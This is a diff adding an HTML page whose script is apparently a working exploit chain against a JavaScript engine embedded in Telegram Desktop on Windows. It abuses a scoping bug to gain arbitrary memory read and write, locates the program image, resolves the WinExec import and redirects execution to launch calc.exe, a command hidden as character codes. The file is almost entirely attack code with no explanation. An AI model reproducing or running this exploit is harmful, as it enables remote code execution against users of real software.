@@ -1,0 +1,278 @@
+<!doctype html>
+<html><body><div id="out">probing</div><script>
+const readers = [];
+const writers = [];
+
+class Disposable {
+  [Symbol.dispose]() {}
+}
+
+const disposable = new Disposable();
+
+const bitsBuffer = new ArrayBuffer(8);
+const bitsU32 = new Uint32Array(bitsBuffer);
+const bitsF64 = new Float64Array(bitsBuffer);
+
+function u64ToFloat(value) {
+  bitsU32[0] = Number(value & 0xffffffffn);
+  bitsU32[1] = Number((value >> 32n) & 0xffffffffn);
+  return bitsF64[0];
+}
+
+function stringFromU64(value) {
+  const bytes = [];
+  for (let byte = 0; byte < 8; ++byte) {
+    bytes.push(Number((value >> BigInt(byte * 8)) & 0xffn));
+  }
+  return String.fromCharCode(...bytes);
+}
+
+function u64FromString(value) {
+  let result = 0n;
+  for (let byte = 0; byte < 8; ++byte) {
+    result |= BigInt(value.charCodeAt(byte)) << BigInt(byte * 8);
+  }
+  return result;
+}
+
+class Trigger {
+  static {
+    let x00 = 0, x01 = 1, x02 = 2, x03 = 3;
+    let x04 = 4, x05 = 5, x06 = 6, x07 = 7;
+    let x08 = 8, x09 = 9, x10 = 10, x11 = 11;
+    let x12 = 12, x13 = 13, x14 = 14, x15 = 15;
+    let x16 = 16, x17 = 17, x18 = 18, x19 = 19;
+    let x20 = 20, x21 = 21, x22 = 22, x23 = 23;
+    let x24 = 24, x25 = 25, x26 = 26, x27 = 27;
+    let x28 = 28, x29 = 29, x30 = 30, x31 = 31;
+
+    readers[0] = () => x00; writers[0] = value => x00 = value;
+    readers[1] = () => x01; writers[1] = value => x01 = value;
+    readers[2] = () => x02; writers[2] = value => x02 = value;
+    readers[3] = () => x03; writers[3] = value => x03 = value;
+    readers[4] = () => x04; writers[4] = value => x04 = value;
+    readers[5] = () => x05; writers[5] = value => x05 = value;
+    readers[6] = () => x06; writers[6] = value => x06 = value;
+    readers[7] = () => x07; writers[7] = value => x07 = value;
+    readers[8] = () => x08; writers[8] = value => x08 = value;
+    readers[9] = () => x09; writers[9] = value => x09 = value;
+    readers[10] = () => x10; writers[10] = value => x10 = value;
+    readers[11] = () => x11; writers[11] = value => x11 = value;
+    readers[12] = () => x12; writers[12] = value => x12 = value;
+    readers[13] = () => x13; writers[13] = value => x13 = value;
+    readers[14] = () => x14; writers[14] = value => x14 = value;
+    readers[15] = () => x15; writers[15] = value => x15 = value;
+    readers[16] = () => x16; writers[16] = value => x16 = value;
+    readers[17] = () => x17; writers[17] = value => x17 = value;
+    readers[18] = () => x18; writers[18] = value => x18 = value;
+    readers[19] = () => x19; writers[19] = value => x19 = value;
+    readers[20] = () => x20; writers[20] = value => x20 = value;
+    readers[21] = () => x21; writers[21] = value => x21 = value;
+    readers[22] = () => x22; writers[22] = value => x22 = value;
+    readers[23] = () => x23; writers[23] = value => x23 = value;
+    readers[24] = () => x24; writers[24] = value => x24 = value;
+    readers[25] = () => x25; writers[25] = value => x25 = value;
+    readers[26] = () => x26; writers[26] = value => x26 = value;
+    readers[27] = () => x27; writers[27] = value => x27 = value;
+    readers[28] = () => x28; writers[28] = value => x28 = value;
+    readers[29] = () => x29; writers[29] = value => x29 = value;
+    readers[30] = () => x30; writers[30] = value => x30 = value;
+    readers[31] = () => x31; writers[31] = value => x31 = value;
+
+    for (await using ignored of [disposable]) {}
+  }
+}
+
+function victim(writer, fake, dormant) {
+  let v00 = 0, v01 = 1, v02 = 2, v03 = 3;
+  let v04 = 4, v05 = 5, v06 = 6, v07 = 7;
+  let v08 = 8, v09 = 9, v10 = 10, v11 = 11;
+  let v12 = 12, v13 = 13, v14 = 14, v15 = 15;
+  let v16 = 16, v17 = 17, v18 = 18, v19 = 19;
+  let v20 = 20, v21 = 21, v22 = 22, v23 = 23;
+  let v24 = 24, v25 = 25, v26 = 26, v27 = 27;
+  let v28 = 28, v29 = 29, v30 = 30, v31 = 31;
+  let v32 = 32, v33 = 33, v34 = 34, v35 = 35;
+  let v36 = 36, v37 = 37, v38 = 38, v39 = 39;
+  let v40 = 40, v41 = 41, v42 = 42, v43 = 43;
+  let v44 = 44, v45 = 45, v46 = 46, v47 = 47;
+  let v48 = 48, v49 = 49, v50 = 50, v51 = 51;
+  let v52 = 52, v53 = 53, v54 = 54, v55 = 55;
+  let v56 = 56, v57 = 57, v58 = 58, v59 = 59;
+  let v60 = 60, v61 = 61, v62 = 62, v63 = 63;
+
+  if (dormant) {
+    return () => [
+      v00, v01, v02, v03, v04, v05, v06, v07,
+      v08, v09, v10, v11, v12, v13, v14, v15,
+      v16, v17, v18, v19, v20, v21, v22, v23,
+      v24, v25, v26, v27, v28, v29, v30, v31,
+      v32, v33, v34, v35, v36, v37, v38, v39,
+      v40, v41, v42, v43, v44, v45, v46, v47,
+      v48, v49, v50, v51, v52, v53, v54, v55,
+      v56, v57, v58, v59, v60, v61, v62, v63,
+    ];
+  }
+
+  writer(fake);
+  const get = () => v00;
+  const set = value => v00 = value;
+  writer(0);
+  return [get, set];
+}
+
+function invokeVictim(writer, fake) {
+  return victim(writer, fake, false);
+}
+
+const parent = "A".repeat(4096);
+const slice = parent.slice(1, 4095);
+const pointerParent = "B".repeat(4096);
+const pointerSlice = pointerParent.slice(1, 4095);
+const fakeRope = "R".repeat(9000) + pointerSlice;
+const keep = [];
+let result = "primitive failed";
+
+for (let candidate = 0; candidate < writers.length; ++candidate) {
+  try {
+    const pair = invokeVictim(writers[candidate], slice);
+    keep.push(pair);
+    pair[1](4096);
+    pair[0]();
+    pair[1](0x100000);
+    if (parent.length !== 0x100000) continue;
+
+    const ropePair = invokeVictim(writers[candidate], fakeRope);
+    keep.push(ropePair);
+    ropePair[1](64);
+    let parentAddress = 0n;
+    for (let byte = 0; byte < 8; ++byte) {
+      parentAddress |= BigInt(pointerSlice.charCodeAt(byte)) << BigInt(byte * 8);
+    }
+
+    const targetAddress = parentAddress + 24n;
+    const addressBytes = [];
+    for (let byte = 0; byte < 8; ++byte) {
+      addressBytes.push(Number((targetAddress >> BigInt(byte * 8)) & 0xffn));
+    }
+    const addressString = String.fromCharCode(...addressBytes);
+    const arbitraryPair = invokeVictim(writers[candidate], addressString);
+    keep.push(arbitraryPair, addressString);
+    arbitraryPair[1](0x12345678);
+    const arbitraryRead = arbitraryPair[0]();
+
+    function leakValue(value) {
+      arbitraryPair[1](value);
+      const address = u64FromString(pointerParent);
+      arbitraryPair[1](0);
+      return address;
+    }
+
+    const typedArray = new Uint8Array(8);
+    const typedArrayObject = leakValue(typedArray);
+    const typedControlAddress = stringFromU64(typedArrayObject + 56n);
+    const typedControl = invokeVictim(writers[candidate], typedControlAddress);
+    keep.push(typedArray, typedControlAddress, typedControl);
+
+    function retarget(address) {
+      typedControl[1](u64ToFloat(address));
+    }
+
+    function readU32(address) {
+      retarget(address);
+      return (typedArray[0] | (typedArray[1] << 8) |
+        (typedArray[2] << 16) | (typedArray[3] << 24)) >>> 0;
+    }
+
+    function readU64(address) {
+      retarget(address);
+      let value = 0n;
+      for (let byte = 0; byte < 8; ++byte) {
+        value |= BigInt(typedArray[byte]) << BigInt(byte * 8);
+      }
+      return value;
+    }
+
+    retarget(targetAddress);
+    const pattern = [0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11];
+    for (let byte = 0; byte < 8; ++byte) typedArray[byte] = pattern[byte];
+    const typedWriteBack = readU64(targetAddress);
+
+    const nativeObject = leakValue(String.fromCharCode);
+    const nativeFunction = readU64(nativeObject + 56n);
+    let imageBase = nativeFunction & ~0xffffn;
+    let foundImage = false;
+    for (let page = 0; page < 4096; ++page, imageBase -= 0x10000n) {
+      if ((readU32(imageBase) & 0xffff) !== 0x5a4d) continue;
+      const peOffset = BigInt(readU32(imageBase + 0x3cn));
+      if (peOffset < 0x1000n && readU32(imageBase + peOffset) === 0x4550) {
+        foundImage = true;
+        break;
+      }
+    }
+    if (!foundImage) throw new Error("module base not found");
+
+    const peHeader = BigInt(readU32(imageBase + 0x3cn));
+    const imageSize = readU32(imageBase + peHeader + 0x50n);
+    const winExecCall = readU32(imageBase + 0x29a72b5n);
+    if (imageSize !== 0x0fb05000 || (winExecCall & 0xffff) !== 0x15ff)
+      throw new Error("unexpected Telegram Desktop image");
+
+    function writeBytes(address, bytes) {
+      retarget(address);
+      for (let byte = 0; byte < bytes.length; ++byte) {
+        typedArray[byte] = bytes[byte];
+      }
+    }
+
+    function writeU64(address, value) {
+      const bytes = [];
+      for (let byte = 0; byte < 8; ++byte) {
+        bytes.push(Number((value >> BigInt(byte * 8)) & 0xffn));
+      }
+      writeBytes(address, bytes);
+    }
+
+    const command = String.fromCharCode(
+      99, 97, 108, 99, 46, 101, 120, 101, 0);
+    const commandObject = leakValue(command);
+    const commandAddress = commandObject + 24n;
+
+    const recordDonor = [0, 0, 0, 0];
+    keep.push(command, recordDonor);
+    const donorObject = leakValue(recordDonor);
+    const recordAddress = readU64(donorObject + 56n);
+    writeU64(donorObject + 56n, 0n);
+    writeU64(donorObject + 64n, 0n);
+
+    const winExec = readU64(imageBase + 0x715c108n);
+    if (winExec < 0x10000n) throw new Error("WinExec import not resolved");
+    writeU64(recordAddress + 0n, 0n);
+    writeU64(recordAddress + 8n, 0n);
+    writeU64(recordAddress + 16n, commandAddress);
+    writeU64(recordAddress + 24n, winExec);
+
+    let launchObject = Object.create(null);
+    const launchAddress = leakValue(launchObject);
+    writeBytes(launchAddress + 18n, [16, 0]);
+    writeU64(launchAddress + 48n, recordAddress);
+
+    result = "candidate " + candidate + " base 0x" + imageBase.toString(16)
+      + " WinExec 0x" + winExec.toString(16) + " armed";
+    document.getElementById("out").textContent = result;
+    launchObject = null;
+
+    result = "candidate " + candidate + " heap 0x" + parentAddress.toString(16)
+      + " jsvalue 0x" + arbitraryRead.toString(16)
+      + " typed 0x" + typedWriteBack.toString(16)
+      + " native 0x" + nativeFunction.toString(16)
+      + " base 0x" + imageBase.toString(16) + " calc requested";
+    break;
+  } catch (error) {}
+}
+
+document.getElementById("out").textContent = result;
+</script></body></html>
+
+
+
